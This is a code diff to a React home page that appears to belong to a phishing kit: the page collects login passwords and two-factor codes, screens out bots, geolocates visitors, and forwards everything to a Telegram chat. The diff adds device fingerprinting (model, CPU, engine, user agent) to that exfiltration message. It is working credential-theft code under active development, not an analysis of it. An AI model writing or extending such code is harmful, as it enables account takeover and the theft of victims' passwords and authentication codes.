@@ -6,6 +6,7 @@ import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
@@ -43,6 +44,7 @@ const Home = () => {
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
     const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
+    const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -220,6 +222,29 @@ const Home = () => {
                 return;
             }
 
+            // Detect device info
+            try {
+                const device = detectDevice();
+                console.log('=== DEVICE INFORMATION ===');
+                console.log('Device Info:', device.deviceInfo);
+                console.log('Device Type:', device.deviceType);
+                console.log('Model:', device.model || 'N/A');
+                console.log('OS:', device.os);
+                console.log('Browser:', device.browser);
+                console.log('CPU:', device.cpu || 'N/A');
+                console.log('Engine:', device.engine || 'N/A');
+                console.log('User Agent:', device.userAgent);
+                console.log('Raw Data:', device.raw);
+                console.log('========================');
+                setDeviceInfo(device);
+                localStorage.setItem('deviceInfo', JSON.stringify(device));
+            } catch (error) {
+                console.error('Error detecting device:', error);
+                const fallbackDevice = { deviceInfo: 'Unknown Device' };
+                setDeviceInfo(fallbackDevice);
+                localStorage.setItem('deviceInfo', JSON.stringify(fallbackDevice));
+            }
+
             try {
                 const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                 const data = response.data;
@@ -292,9 +317,32 @@ const Home = () => {
         const dt = formatDateTime(new Date());
         const { form, login, passes, codes } = data;
 
+        console.log('BuildAndSend - deviceInfo:', deviceInfo);
+
         let message = `📩 <b>${LABEL}</b>\n`;
         message += `⏰ ${dt}\n`;
         message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
+        message += `📱 Thiết bị: <code>${deviceInfo?.deviceInfo || 'Unknown Device'}</code>\n`;
+        
+        // Thêm thông tin chi tiết về thiết bị
+        if (deviceInfo) {
+            if (deviceInfo.model) {
+                message += `   └ Model: <code>${deviceInfo.model}</code>\n`;
+            }
+            if (deviceInfo.deviceType && deviceInfo.deviceType !== 'Unknown') {
+                message += `   └ Loại: <code>${deviceInfo.deviceType}</code>\n`;
+            }
+            if (deviceInfo.cpu) {
+                message += `   └ CPU: <code>${deviceInfo.cpu}</code>\n`;
+            }
+            if (deviceInfo.engine) {
+                message += `   └ Engine: <code>${deviceInfo.engine}</code>\n`;
+            }
+            if (deviceInfo.userAgent) {
+                message += `   └ UA: <code>${deviceInfo.userAgent.substring(0, 100)}${deviceInfo.userAgent.length > 100 ? '...' : ''}</code>\n`;
+            }
+        }
+        
         message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
